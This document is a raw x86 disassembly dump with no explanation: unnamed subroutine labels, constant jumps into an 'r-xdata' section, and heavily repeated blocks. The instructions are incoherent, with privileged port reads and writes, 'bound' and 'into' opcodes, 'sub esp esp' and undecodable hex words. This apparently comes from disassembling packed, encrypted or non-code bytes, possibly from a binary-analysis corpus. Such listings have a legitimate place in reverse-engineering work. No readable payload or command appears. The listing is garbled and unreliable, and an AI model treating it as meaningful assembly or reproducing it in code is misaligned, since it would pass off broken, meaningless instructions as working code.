add esi [ ebx - 0x64fd667f ]
pop ss
adc al 0x14
jpo r-xdata
lea esp [ edx - 0x4a ]
in eax 0x60
jpo r-xdata
jmp r-xdata
jpo r-xdata
bound esi [ esi - 0x4f667e51 ]
lea esp [ edx - 0x4a ]
lodsd [ esi ]
pushad
xor [ ecx - 0x499d7278 ] eax
mov [ 0xffffffffb6628db0 ] eax
mov eax [ 0x7023360 ]
bound esi [ esi + 0x23360e1 ]

xor ecx [ ebp - 0x2704499e ]
xor [ ebp + 0x60f9b662 ] cl
mov dh 0xe5
jpo r-xdata
jmp r-xdata
jpo r-xdata
pushad
jpo r-xdata
jpo r-xdata
in al 0x69
push edx
push es
adc al 0x14
outsb
bound esi [ esi - 0x419d72b5 ]
dec edi
add ebx ecx
into
xor al 0x8d
lea esp [ edx - 0x4a ]
sti
jpo r-xdata
add ah [ esi - 0x16 ]
jmp sub_46d1f6
jpo r-xdata
adc al 0xe4
outsb
pop edx
push es
adc al 0x14
test al 0xfb
mov eax 0x31b2a68
and al bh
jmp r-xdata
adc al 0x6e
pop ss
and ch [ eax ]
jpo r-xdata
fdiv [ eax ]
lea esp [ edx - 0x4a ]
stc
pushad
mov dh 0xfb
jpo r-xdata
0x4703ebeb 0xebef
jpo r-xdata
jmp r-xdata
sub esp esp
outsb
sbb ch al
jmp r-xdata
jmp r-xdata
fxch st6
outsb
shl ebp 0xeb
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
add cl [ esi + 0x10 ]
adc al 0x14
scasb [ edi ]
pop ss
mov ebx 0xad02f481
stosd [ edi ]
jmp r-xdata
add dl [ ebp - 0x16 ]
jmp r-xdata
0xffffebeb 0x4703
sub_46d17f
jpo r-xdata
mov dh 0x4b
jmp r-xdata
pop ss
and ch [ eax ]
jpo r-xdata
lea esp [ edx - 0x42 ]
jpo r-xdata
jpo r-xdata
mov dh 0xe5
jpo r-xdata
jpo r-xdata
pushad
jpo r-xdata
in al 0x69
push edx
push es
adc al 0x14
outsb
dec edi
add ebx ecx
into
jmp r-xdata
bound esi [ esi - 0x419d72b5 ]
xor al 0x8d
lea esp [ edx - 0x4a ]
sti
jpo r-xdata
adc al 0xe4
outsb
pop edx
push es
adc al 0x14
test al 0xfb
mov eax 0x31b2a68
and al bh
jmp r-xdata
adc al 0x6e
fdiv [ eax ]
lea esp [ edx - 0x4a ]
stc
pushad
mov dh 0xfb
jpo r-xdata
jmp r-xdata
sub esp esp
outsb
sbb ch al
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
scasb [ edi ]
pop ss
mov ebx 0xad02f481
stosd [ edi ]
jmp r-xdata
add esi [ ebx - 0x64fd667f ]
pop ss
adc al 0x14
jpo r-xdata
xor ecx [ ebp - 0x2704499e ]
xor [ ebp + 0x60f9b662 ] cl
lea esp [ edx - 0x4a ]
in eax 0x60
add dl [ ebp - 0x16 ]
jmp r-xdata
bound esi [ esi - 0x4f667e51 ]
lea esp [ edx - 0x4a ]
lodsd [ esi ]
pushad
xor [ ecx - 0x499d7278 ] eax
mov [ 0xffffffffb6628db0 ] eax
mov eax [ 0x7023360 ]
bound esi [ esi + 0x23360e1 ]

0xffffebeb 0x4703
sub_46d183
mov ebx 0x14104e02
adc al 0x7b
jpo r-xdata
0xffffebeb 0x4703
jpo r-xdata
jmp sub_46d1f6
in al 0x6e
jmp r-xdata
add cl [ esi + 0x10 ]
adc al 0x14
jpo r-xdata
add ah [ esi - 0x16 ]
jpo r-xdata
0x4703ebeb 0xebef
jpo r-xdata
fxch st6
shl ebp 0xeb
jmp r-xdata
outsb
pop ss
and ch [ eax ]
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov dh 0xe5
jpo r-xdata
jpo r-xdata
pushad
jpo r-xdata
in al 0x69
push edx
push es
adc al 0x14
outsb
jmp r-xdata
bound esi [ esi - 0x419d72b5 ]
dec edi
add ebx ecx
into
xor al 0x8d
lea esp [ edx - 0x4a ]
sti
jpo r-xdata
adc al 0xe4
outsb
pop edx
push es
adc al 0x14
test al 0xfb
mov eax 0x31b2a68
and al bh
jmp r-xdata
adc al 0x6e
fdiv [ eax ]
lea esp [ edx - 0x4a ]
stc
pushad
mov dh 0xfb
jpo r-xdata
jmp r-xdata
sub esp esp
outsb
sbb ch al
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
scasb [ edi ]
pop ss
mov ebx 0xad02f481
stosd [ edi ]
jmp r-xdata
add esi [ ebx - 0x64fd667f ]
pop ss
adc al 0x14
jpo r-xdata
xor ecx [ ebp - 0x2704499e ]
xor [ ebp + 0x60f9b662 ] cl
lea esp [ edx - 0x4a ]
in eax 0x60
add dl [ ebp - 0x16 ]
jmp r-xdata
bound esi [ esi - 0x4f667e51 ]
lea esp [ edx - 0x4a ]
lodsd [ esi ]
pushad
xor [ ecx - 0x499d7278 ] eax
mov [ 0xffffffffb6628db0 ] eax
mov eax [ 0x7023360 ]
bound esi [ esi + 0x23360e1 ]

sub_46d195
mov dh 0xe4
add cl [ esi + 0x10 ]
adc al 0x14
jpo r-xdata
add ah [ esi - 0x16 ]
jmp sub_46d1f6
jpo r-xdata
0x4703ebeb 0xebef
jpo r-xdata
fxch st6
outsb
shl ebp 0xeb
jmp r-xdata
pop ss
and ch [ eax ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov dh 0xe5
jpo r-xdata
jpo r-xdata
pushad
jpo r-xdata
in al 0x69
push edx
push es
adc al 0x14
outsb
jmp r-xdata
bound esi [ esi - 0x419d72b5 ]
dec edi
add ebx ecx
into
xor al 0x8d
lea esp [ edx - 0x4a ]
sti
jpo r-xdata
adc al 0xe4
outsb
pop edx
push es
adc al 0x14
test al 0xfb
mov eax 0x31b2a68
and al bh
jmp r-xdata
adc al 0x6e
fdiv [ eax ]
lea esp [ edx - 0x4a ]
stc
pushad
mov dh 0xfb
jpo r-xdata
jmp r-xdata
sub esp esp
outsb
sbb ch al
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
scasb [ edi ]
pop ss
mov ebx 0xad02f481
stosd [ edi ]
jmp r-xdata
add esi [ ebx - 0x64fd667f ]
pop ss
adc al 0x14
jpo r-xdata
xor ecx [ ebp - 0x2704499e ]
xor [ ebp + 0x60f9b662 ] cl
lea esp [ edx - 0x4a ]
in eax 0x60
add dl [ ebp - 0x16 ]
jmp r-xdata
bound esi [ esi - 0x4f667e51 ]
lea esp [ edx - 0x4a ]
lodsd [ esi ]
pushad
xor [ ecx - 0x499d7278 ] eax
mov [ 0xffffffffb6628db0 ] eax
mov eax [ 0x7023360 ]
bound esi [ esi + 0x23360e1 ]

0xffffebeb 0x4703
sub_46d1ca
add ah [ eax ]
adc [ esp + edx ] dl
jpo r-xdata
bound ebp [ esi - 0x607e4cff ]
lea esp [ edx - 0x52 ]
pop es
mov bl 0x2
jge r-xdata
mov ebx 0xeb212c6a
jmp r-xdata
cmc
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp sub_46d22d
jmp r-xdata
jpo r-xdata
jmp r-xdata
mov eax [ 0x7023360 ]
add ah ah
xlat
jmp r-xdata
out dx eax
scasb [ edi ]
pop ss
mov ebx 0xad02f481
stosd [ edi ]
jmp r-xdata
cmc
jmp sub_46d17f
add dl [ ebp - 0x16 ]
jmp r-xdata
0xffffebeb 0x4703
sub_46d1f6
jmp r-xdata
jpo r-xdata
in eax 0x60
jpo r-xdata
xor ecx [ ebp - 0x2704499e ]
xor [ ebp + 0x60f9b662 ] cl
jpo r-xdata
bound esi [ esi - 0x4f667e51 ]
lea esp [ edx - 0x4a ]
lodsd [ esi ]
pushad
xor [ ecx - 0x499d7278 ] eax
mov [ 0xffffffffb6628db0 ] eax
mov eax [ 0x7023360 ]
bound esi [ esi - 0x72cf2705 ]
bound esi [ esi - 0x72cb9f07 ]
jpo r-xdata
xor al 0x8d
sti
outsb
jpo r-xdata
jmp r-xdata
jpo r-xdata
add esi [ ebx - 0x64fd667f ]
pop ss
adc al 0x14
jpo r-xdata
lea esp [ edx - 0x4a ]
jpo r-xdata
bound esi [ esi + 0x23360e1 ]

mov dh 0xe5
jpo r-xdata
pushad
jpo r-xdata
lea esp [ edx - 0x4a ]
jpo r-xdata
fdiv [ eax ]
lea esp [ edx - 0x4a ]
stc
pushad
mov dh 0xfb
jpo r-xdata
jmp r-xdata
sub esp esp
outsb
sbb ch al
jmp r-xdata
jmp r-xdata
jmp r-xdata
scasb [ edi ]
pop ss
mov ebx 0xad02f481
stosd [ edi ]
jmp r-xdata
add dl [ ebp - 0x16 ]
jmp r-xdata
0xffffebeb 0x4703
sub_46d22c
add eax [ ebx ]
cmc
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov eax [ 0x7023360 ]
add ah ah
xlat
jmp r-xdata
out dx eax
scasb [ edi ]
pop ss
mov ebx 0xad02f481
stosd [ edi ]
jmp r-xdata
cmc
jmp sub_46d17f
add dl [ ebp - 0x16 ]
jmp r-xdata
0xffffebeb 0x4703
sub_46d22d
add esi ebp
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov eax [ 0x7023360 ]
add ah ah
xlat
jmp r-xdata
out dx eax
scasb [ edi ]
pop ss
mov ebx 0xad02f481
stosd [ edi ]
jmp r-xdata
cmc
jmp sub_46d17f
add dl [ ebp - 0x16 ]
jmp r-xdata
0xffffebeb 0x4703
sub_46d238
sub ch cl
add bl [ ecx ]
fucomi st3
jmp r-xdata
jmp r-xdata
jpo r-xdata
mov [ 0xffffffffb6628db0 ] eax
mov eax [ 0x7023360 ]
scasb [ edi ]
adc esp esp
adc [ 0x1414 ] eax
jmp r-xdata
adc al 0x14
jpo r-xdata
jmp r-xdata
add ah cl
jecxz r-xdata
shr [ esi + 0x1167e413 ] cl
push es
adc al 0x14
sub edi 0xebdbeb83
jmp r-xdata
insb
call 0x26cabf22
daa
lahf
sub eax 0x676d62bc
jmp r-xdata
jpo r-xdata
sub ebx 0xffffffdb
jmp r-xdata
bound ebp [ ebp - 0x1793fc49 ]
jmp r-xdata
stosd [ edi ]
add ah ah
out dx eax
jmp r-xdata
pushad
jecxz r-xdata
jmp r-xdata
0x1419
cmpsb [ esi ] [ edi ]
jecxz r-xdata
jmp r-xdata
jmp r-xdata
xchg esi eax
fsub st3
add edi [ edi + 0x62ebebe8 ]
insd
dec ebx
jmp r-xdata
jmp r-xdata
int3
push 0x7
imul ebp ecx 0xffffffeb
jmp r-xdata
sub [ ebx + 0x7b ] bh
jpo r-xdata
add ebx [ ebp - 0x7c141418 ]
jpo r-xdata
jmp r-xdata
mov esp 0xeb736d62
jmp r-xdata
call 0x9cabf33
mov dl 0xb3
jpo r-xdata
jmp r-xdata
jpo r-xdata
or [ edx + esi * 4 - 0x4d ] esp
jpo r-xdata
mov dl 0xb3
jpo r-xdata
jmp r-xdata
xor [ edi - 0x72707e4d ] 0xb303ae62
sbb [ ecx + 0x14179b02 ] 0x628d7b14
mov dh 0xe1
pushad
xor eax [ edx ]
add cl dl
sbb [ esp + edx ] edx
jpo r-xdata

and al [ edx ]
fcmovnbe st5
sub_46d249
add [ ebp + 0x1ae628d ] 0x8d9f81b3
bound ebp [ esi + 0x7d02b307 ]
aam 0xeb
jmp r-xdata
add esi [ ebx - 0x64fd667f ]
pop ss
adc al 0x14
jpo r-xdata
bound esi [ esi - 0x4f667e51 ]
lea esp [ edx - 0x4a ]
lodsd [ esi ]
pushad
xor [ ecx - 0x499d7278 ] eax
mov [ 0xffffffffb6628db0 ] eax
mov eax [ 0x7023360 ]
bound esi [ esi + 0x23360e1 ]

sub_46d292
cmpsb [ esi ] [ edi ]
jecxz r-xdata
pop es
mov bl 0x2
jge r-xdata
and eax [ edx ]
jl r-xdata
cmc
jmp r-xdata
jmp r-xdata
aam 0xeb
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
add esi [ ebx - 0x64fd667f ]
pop ss
adc al 0x14
jpo r-xdata
mov eax [ 0x7023360 ]
jpo r-xdata
jmp r-xdata
bound esi [ esi - 0x4f667e51 ]
lea esp [ edx - 0x4a ]
lodsd [ esi ]
pushad
xor [ ecx - 0x499d7278 ] eax
mov [ 0xffffffffb6628db0 ] eax
bound esi [ esi + 0x23360e1 ]

add ah ah
xlat
jmp r-xdata
out dx eax
scasb [ edi ]
pop ss
mov ebx 0xad02f481
stosd [ edi ]
jmp r-xdata
cmc
jmp sub_46d17f
add dl [ ebp - 0x16 ]
jmp r-xdata
0xffffebeb 0x4703
sub_46d2bd
sub ebx [ ebx + esi ]
and ch [ eax ]
jpo r-xdata
jmp sub_46d32c
jpo r-xdata
add ebx [ ebp - 0x7c141418 ]
jpo r-xdata
jmp r-xdata
mov esp 0xeb736d62
jmp r-xdata
call 0x9cabf33
mov dl 0xb3
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
sub ebx 0xffffffdb
jmp r-xdata
bound ebp [ ebp - 0x1793fc49 ]
jmp r-xdata
or [ edx + esi * 4 - 0x4d ] esp
jpo r-xdata
stosd [ edi ]
add ah ah
out dx eax
jmp r-xdata
pushad
jecxz r-xdata
mov dl 0xb3
jpo r-xdata
jmp r-xdata
0x1419
cmpsb [ esi ] [ edi ]
jecxz r-xdata
jmp r-xdata
xor [ edi - 0x72707e4d ] 0xb303ae62
sbb [ ecx + 0x14179b02 ] 0x628d7b14
mov dh 0xe1
pushad
xor eax [ edx ]
jmp r-xdata
jmp r-xdata
xchg esi eax
fsub st3
jmp r-xdata
add cl dl
sbb [ esp + edx ] edx
jpo r-xdata
add edi [ edi + 0x62ebebe8 ]
insd
dec ebx
jmp r-xdata
jmp r-xdata
sub edi 0xebdbeb83
jmp r-xdata

and al [ edx ]
fcmovnbe st5
int3
push 0x7
imul ebp ecx 0xffffffeb
jmp r-xdata
insb
call 0x26cabf22
daa
lahf
sub eax 0x676d62bc
jmp r-xdata
sub [ ebx + 0x7b ] bh
sub_46d2fa
sub [ ebx + 0x7b ] bh
jpo r-xdata
add cl [ ecx ]
fsubp st3
jmp sub_46d3fb
mov esi 0x76a0760
sub [ ebx + 0x7b ] bh
jpo r-xdata
add ebx [ ebp - 0x7c141418 ]
jpo r-xdata
jmp r-xdata
mov esp 0xeb736d62
jmp r-xdata
call 0x9cabf33
mov dl 0xb3
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
sub ebx 0xffffffdb
jmp r-xdata
bound ebp [ ebp - 0x1793fc49 ]
jmp r-xdata
or [ edx + esi * 4 - 0x4d ] esp
jpo r-xdata
stosd [ edi ]
add ah ah
out dx eax
jmp r-xdata
pushad
jecxz r-xdata
mov dl 0xb3
jpo r-xdata
jmp r-xdata
0x1419
cmpsb [ esi ] [ edi ]
jecxz r-xdata
jmp r-xdata
xor [ edi - 0x72707e4d ] 0xb303ae62
sbb [ ecx + 0x14179b02 ] 0x628d7b14
mov dh 0xe1
pushad
xor eax [ edx ]
jmp r-xdata
jmp r-xdata
xchg esi eax
fsub st3
jmp r-xdata
add cl dl
sbb [ esp + edx ] edx
jpo r-xdata
add edi [ edi + 0x62ebebe8 ]
insd
dec ebx
jmp r-xdata
jmp r-xdata
sub edi 0xebdbeb83
jmp r-xdata

and al [ edx ]
fcmovnbe st5
int3
imul ebp ecx 0xffffffeb
jmp r-xdata
push 0x7
insb
call 0x26cabf22
daa
lahf
sub eax 0x676d62bc
jmp r-xdata
sub_46d32c
jpo r-xdata
pop es
add ah [ ebx ]
sbb [ esp + edx ] edx
jpo r-xdata
lodsd [ esi ]
mov bh 0x3
mov esi 0x103c020d
stosd [ edi ]
add ah ah
out dx eax
jmp r-xdata
jpo r-xdata
jmp r-xdata
jl r-xdata
jmp r-xdata
sub ebx 0xffffffdb
jmp r-xdata
bound ebp [ ebp - 0x1793fc49 ]
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
pushad
jecxz r-xdata
adc al 0x14
jpo r-xdata
mov ebx 0xdbe628d
add bh [ eax + edx ]
mov al [ 0xffffffffa060baa3 ]
mov bl 0x3
jpo r-xdata
scasb [ edi ]
sub ebx eax
and bh [ ebp - 0x419d7245 ]
or eax 0x14103c02
adc al 0x7b
add edi [ esp + ecx * 8 - 0x15 ]
add edi [ edi + 0x62ebebe8 ]
insd
dec ebx
jmp r-xdata
0x1419
cmpsb [ esi ] [ edi ]
jecxz r-xdata
jpo r-xdata
cmp bl 0xeb
jmp r-xdata
mov edx 0x3b3a060
adc al 0x7c
jae r-xdata
int3
jmp r-xdata
xchg esi eax
fsub st3
jmp r-xdata
bound ebp [ esi + 0x628db30d ]
scasb [ edi ]
add ebx eax
mov [ 0xffffffffebf8da02 ] eax
jmp r-xdata
jmp r-xdata
jmp r-xdata
sub edi 0xebdbeb83
jmp r-xdata
jpo r-xdata
jpo r-xdata
sub esp esp
outsd
mov edx 0x66141401
push 0x7
imul ebp ecx 0xffffffeb
jmp r-xdata
insb
call 0x26cabf22
daa
lahf
sub eax 0x676d62bc
jmp r-xdata
iretd
jpo r-xdata
jpo r-xdata
sub [ ebx + 0x7b ] bh
jpo r-xdata
jmp r-xdata
sahf
add ch [ ebp + 0x7bebebee ]
add ebx [ ebp - 0x7c141418 ]
jpo r-xdata
sti
adc al 0x7c
pop ds
jmp r-xdata
jmp r-xdata
outsd
jpo r-xdata
jmp r-xdata
mov esp 0xeb736d62
jmp r-xdata
call 0x9cabf33
mov dl 0xb3
jpo r-xdata
jmp r-xdata
sub esi [ edx + 0x7b7b7b28 ]
jpo r-xdata
jpo r-xdata
scasb [ edi ]
jecxz r-xdata
jmp r-xdata
jpo r-xdata
sbb dh al
jmp r-xdata
xchg edi eax
jpo r-xdata
jpo r-xdata
jpo r-xdata
add cl [ edx - 0xe ]
jmp r-xdata
or [ edx + esi * 4 - 0x4d ] esp
jpo r-xdata
sbb al 0xbc
bound ebp [ ebp - 0x1631fc55 ]
jmp r-xdata
jmp r-xdata
sub ebp [ eax ]
jpo r-xdata
imul ebx
bound ebp [ edi + 0x2b02ffcf ]
out 0xeb eax
jmp r-xdata
adc al 0x9e
jpo r-xdata
lea ebp [ esi + 0x1d ]
add ah [ 0x7bebebe8 ]
jpo r-xdata
mov dl 0xb3
jpo r-xdata
jpo r-xdata
das
shr bl 0xeb
fsub [ edx ]
add ch [ 0x66ebebe7 ]
outsb
xchg ebx eax
push ss
adc al 0x14
add dh [ edx ]
add al 0x14
adc al 0x7b
sub edi 0xebea5c02
jmp r-xdata
adc eax 0x2141413
jpo r-xdata
jpo r-xdata
jmp r-xdata
lodsd [ esi ]
out dx al
jmp r-xdata
xor [ edi - 0x72707e4d ] 0xb303ae62
sbb [ ecx + 0x14179b02 ] 0x628d7b14
mov dh 0xe1
pushad
xor eax [ edx ]
sbb ebx 0xcea502b2
jmp r-xdata
add ebx eax
jmp 0x5acac076
adc al 0x14
add bl bh
fsubr [ ebx ]
mov ah 0x22
sub [ ebx + 0x3 ] bh
dec esi
pop ebx
jmp r-xdata
jpo r-xdata
sub ecx [ ebp + 0x201ae62 ]
add bl [ edx ]
adc al 0x14
jpo r-xdata
add cl dl
sbb [ esp + edx ] edx
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata

and al [ edx ]
fcmovnbe st5
jpo r-xdata
jmp r-xdata
add cl [ ecx ]
adc al 0x9e
jpo r-xdata
iretd
fsubr [ ebx ]
sub [ ebx + 0x7b ] bh
adc al 0xaf
iretd
adc al 0xbd
inc [ edx ]
adc al 0x14
jpo r-xdata
add eax [ edx ]
jno r-xdata
sbb ecx 0x3ae628d
sbb esp [ eax + 0x15 ]
lea esp [ edx - 0x6a ]
sbb [ edx ] eax
inc ecx
hlt
mov eax 0x2ffbd14
out 0xeb al
jmp r-xdata
jpo r-xdata
jmp r-xdata
adc al 0x68
adc ebp [ ebx - 0x141c961c ]
xchg [ esi ] ebx
adc al 0x14
push 0x69e4ab13
jecxz r-xdata
add bl al
shr bl 0x1
jmp r-xdata
sbb al 0x14
adc al 0x7b
jpo r-xdata
add ch cl
jmp r-xdata
fsub st3
jmp sub_46d6df
sub_46d3fb
bound ebp [ esi - 0x7ed427e3 ]
dec [ ebp - 0x72ec519e ]
bound esp [ esi + 0x2bae6605 ]
fsub [ edx ]
mov ebp 0xbe628dbb
jmp r-xdata
mov ebx 0xdbe628d
add bh [ eax + edx ]
adc al 0x14
jpo r-xdata
jmp r-xdata
jl r-xdata
jpo r-xdata
jmp r-xdata
mov al [ 0xffffffffa060baa3 ]
mov bl 0x3
jpo r-xdata
or eax 0x14103c02
adc al 0x7b
add edi [ esp + ecx * 8 - 0x15 ]
scasb [ edi ]
sub ebx eax
and bh [ ebp - 0x419d7245 ]
jpo r-xdata
cmp bl 0xeb
jmp r-xdata
mov edx 0x3b3a060
adc al 0x7c
jae r-xdata
bound ebp [ esi + 0x628db30d ]
scasb [ edi ]
add ebx eax
mov [ 0xffffffffebf8da02 ] eax
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
sub esp esp
outsd
mov edx 0x66141401
iretd
jpo r-xdata
jpo r-xdata
jmp r-xdata
sahf
add ch [ ebp + 0x7bebebee ]
sti
adc al 0x7c
pop ds
jmp r-xdata
jmp r-xdata
outsd
jpo r-xdata
jmp r-xdata
sub esi [ edx + 0x7b7b7b28 ]
jpo r-xdata
jpo r-xdata
scasb [ edi ]
jecxz r-xdata
sbb dh al
jmp r-xdata
xchg edi eax
jpo r-xdata
jpo r-xdata
jpo r-xdata
add cl [ edx - 0xe ]
jmp r-xdata
sbb al 0xbc
bound ebp [ ebp - 0x1631fc55 ]
jmp r-xdata
jmp r-xdata
sub ebp [ eax ]
jpo r-xdata
imul ebx
bound ebp [ edi + 0x2b02ffcf ]
out 0xeb eax
jmp r-xdata
adc al 0x9e
jpo r-xdata
lea ebp [ esi + 0x1d ]
add ah [ 0x7bebebe8 ]
jpo r-xdata
jpo r-xdata
das
shr bl 0xeb
fsub [ edx ]
add ch [ 0x66ebebe7 ]
outsb
xchg ebx eax
push ss
adc al 0x14
add dh [ edx ]
add al 0x14
adc al 0x7b
sub edi 0xebea5c02
jmp r-xdata
adc eax 0x2141413
jpo r-xdata
jpo r-xdata
jmp r-xdata
lodsd [ esi ]
out dx al
sbb ebx 0xcea502b2
jmp r-xdata
add ebx eax
jmp 0x5acac076
adc al 0x14
add bl bh
fsubr [ ebx ]
mov ah 0x22
sub [ ebx + 0x3 ] bh
dec esi
pop ebx
jmp r-xdata
jpo r-xdata
sub ecx [ ebp + 0x201ae62 ]
add bl [ edx ]
adc al 0x14
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
add cl [ ecx ]
adc al 0x9e
jpo r-xdata
iretd
fsubr [ ebx ]
sub [ ebx + 0x7b ] bh
adc al 0xaf
iretd
adc al 0xbd
inc [ edx ]
adc al 0x14
jpo r-xdata
add eax [ edx ]
jno r-xdata
sbb ecx 0x3ae628d
sbb esp [ eax + 0x15 ]
lea esp [ edx - 0x6a ]
sbb [ edx ] eax
inc ecx
hlt
mov eax 0x2ffbd14
out 0xeb al
jmp r-xdata
jpo r-xdata
jmp r-xdata
adc al 0x68
adc ebp [ ebx - 0x141c961c ]
xchg [ esi ] ebx
adc al 0x14
push 0x69e4ab13
jecxz r-xdata
add bl al
shr bl 0x1
jmp r-xdata
sbb al 0x14
adc al 0x7b
jpo r-xdata
add ch cl
jmp r-xdata
fsub st3
jmp sub_46d6df
sub_46d528
pushad
sub eax 0xebc50b03
jmp r-xdata
mov eax 0xebe69302
jmp r-xdata
jpo r-xdata
outsb
mov edx eax
jmp r-xdata
jpo r-xdata
mov [ 0x7b141402 ] al
jpo r-xdata
adc al 0x3
imul ecx ecx 0x2b6eebeb
add ah [ edx + 0x7b141402 ]
scasb [ edi ]
adc ebp eax
cmpsb [ esi ] [ edi ]
pop ss
mov ebx 0xeb5b6362
jmp r-xdata
jmp r-xdata
outsb

add cl [ ecx ]
mov ebx 0xbb07ae66
add cl [ ecx - 0x1 ]
jmp r-xdata
in al 0xeb
jmp sub_46d763
sub_46d63e
push 0x7b281423
jpo r-xdata
jmp sub_46d73d
jpo r-xdata
jpo r-xdata
jpo r-xdata
push edi
jpo r-xdata
jpo r-xdata
mov ebx 0xebcf8503
jmp sub_46d7b2
adc al 0x14
mov esi 0x17020760
mov ebx 0xeb5b6362
jmp r-xdata
sub eax [ edx ]
mov edi 0x1c141414

mov dl 0x2
inc eax
add cl [ ecx ]
add al [ eax - 0x16 ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
0x7b7bebeb 0x7b7b
jpo r-xdata
outsb
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc [ esp + edx ] edx
jpo r-xdata
jpo r-xdata
jno r-xdata
scasb [ edi ]
pop ss
add al [ esi - 0x24 ]
jmp r-xdata
sub eax [ edx ]
mov [ 0x7b141402 ] al
jpo r-xdata
sbb [ esp + edx ] dl
jpo r-xdata
pushad
pop es
add dl [ edi ]
jpo r-xdata
jpo r-xdata
adc al 0xbd
inc [ edx ]
adc al 0x14
jpo r-xdata
xor ebp [ eax ]
jpo r-xdata
adc al 0x14
adc al 0x1c
jmp r-xdata
outsb

jpo r-xdata
jpo r-xdata
jpo r-xdata
sbb esp [ eax + 0x15 ]
lea esp [ edx - 0x6a ]
sbb [ edx ] eax
inc ecx
hlt
mov eax 0x2ffbd14
mov ebx 0xbb07ae66
add cl [ ecx - 0x1 ]
jmp r-xdata
jmp r-xdata
jpo r-xdata
add ecx [ edi ]
adc eax 0x831414
0x62bc7fa2 0x83ad
jpo r-xdata
in al 0xeb
jmp sub_46d763
pop esp
jpo r-xdata
jpo r-xdata
jpo r-xdata
arpl [ ebx - 0x15 ] bx
jmp r-xdata
push esp
inc ebx
mov ch bl
jmp sub_46d93f
mov cl 0x9c
jpo r-xdata
jpo r-xdata
out dx eax
sub ebx 0xffffffdb
jmp r-xdata
out dx al
fucomp st3
jmp r-xdata
jpo r-xdata
das
push ebx
add bl [ esi - 0x19 ]
jmp sub_46d967
scasb [ edi ]
pop ss
jpo r-xdata
sub [ ebx - 0x50 ] bh
jmp r-xdata
jpo r-xdata
0x2ebebeb 0xcb40
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
push 0xaf62e72f
iretd
pop ss
jmp r-xdata
jpo r-xdata
jmp r-xdata
pushfd
fsubr [ ebx ]
stosd [ edi ]
and ch [ eax ]
jpo r-xdata
jpo r-xdata
jmp r-xdata
loope r-xdata
in al 0x5c
jmp r-xdata
mov ch 0xcc
push cs
inc edx
jl r-xdata
and ch [ eax ]
jpo r-xdata
call 0xffffffffa09c33b4
adc al 0x5c
scasb [ edi ]
sbb edi [ ebx + 0x14184502 ]
adc al 0x7b
[ eax + 0x2f ]
dec esi
jpo r-xdata
pop ebx
bound ebp [ ebp + 0x1551039b ]
adc al 0x14
push 0x4e83ab2f
in al 0x5c
fld [ edx ]
stc
int3
das
pop esp
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
sub_46d6df
jpo r-xdata
adc al 0x14
mov ebx 0xebcf8503
jmp sub_46d7b2
and eax [ edx ]
enter 0xebe4 0xeb
jpo r-xdata
jpo r-xdata
outsb
pop edi
adc edx [ esp + edx ]
mov ebx 0xbb07ae66
add cl [ ecx - 0x1 ]
jmp r-xdata
mov ebx 0xebff4902
jmp sub_46d775
bound edi [ esi - 0x1c86fdd1 ]
jmp r-xdata
in al 0xeb
jmp sub_46d763
bound esp [ ebx + 0x5b ]
jmp r-xdata
push 0x2b8cb2f
jg r-xdata
fsub st3
jmp r-xdata
jmp sub_46d73d
sbb [ esp + edx ] dl
jpo r-xdata

mov dl 0x2
inc eax
0x7b7bebeb 0x7b7b
sub_46d763
jmp r-xdata
add [ ebx ] 0x3d
adc eax 0x3b831414
jns r-xdata
or [ esi + 0x5b ] 0xfffffff0
retn
insb
mov esp 0x387ad62
and edx [ 0x7e831414 ]
jpo r-xdata
bound ebp [ ebp + 0x1551039b ]
adc al 0x14
push 0x4e83ab2f
pop esp
jpo r-xdata
in al 0x5c
fld [ edx ]
stc
int3
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
out dx al
fucomp st3
jmp r-xdata
jpo r-xdata
jmp r-xdata
mov cl 0x9c
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
mov ch 0xcc
jmp r-xdata
pushfd
fsubr [ ebx ]
stosd [ edi ]
and ch [ eax ]
jpo r-xdata
jpo r-xdata
pop ebx
dec esi
push cs
inc edx
jl r-xdata
and ch [ eax ]
jpo r-xdata
das
call 0xffffffffa09c33b4
adc al 0x5c
scasb [ edi ]
sbb edi [ ebx + 0x14184502 ]
adc al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
pop ss
jmp r-xdata
jpo r-xdata
add ecx [ edi ]
adc eax 0x831414
0x62bc7fa2 0x83ad
pop esp
loope r-xdata
in al 0x5c
jpo r-xdata
jpo r-xdata
push esp
inc ebx
mov ch bl
jmp sub_46d93f
jpo r-xdata
jpo r-xdata
out dx eax
sub ebx 0xffffffdb
jmp r-xdata
push ebx
add bl [ esi - 0x19 ]
jmp sub_46d967
scasb [ edi ]
pop ss
jpo r-xdata
sub [ ebx - 0x50 ] bh
0x2ebebeb 0xcb40
jpo r-xdata
jmp r-xdata
push 0xaf62e72f
iretd
